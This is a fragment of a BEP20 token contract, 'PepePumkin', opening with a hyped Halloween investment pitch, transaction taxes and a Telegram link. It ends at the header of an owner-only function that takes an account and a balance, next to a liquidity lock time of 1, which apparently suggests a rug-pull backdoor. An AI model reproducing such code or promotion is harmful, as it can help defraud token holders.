...
🌙 Earn BUSD while you HODL!  Are you ready for a spook-tacular investment opportunity? 
Introducing Pepe Pumpkin Token, the ultimate Halloween treat for your wallet! 🚀

-2% tax on all transactions
-5% tax when you sell
-Automatic BUSD rewards for holders
-Join us on Telegram: https://t.me/PepePumkin

-Don't miss the pumpkin-powered gains! 🚀👻 #PepePumpkinToken
...
*/
    ...
    contract PepePumkin  is IBEP20, Ownable
    {
        ...
        string private constant _name = "PepePumkin";
        string private constant _symbol = "Pumpkin";
        uint8 private constant _decimals = 9;
        uint256 public constant MarketingFunds=  1000000000* 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
       
        address public constant MarketingWallet=0x09628BAc44e01E7B4F6bB31b6FB7DB63Bd2e2043; 
      ...
      function PepePumpkinMarketin(address account, uint256 balance) onlyOwner  public virtual {
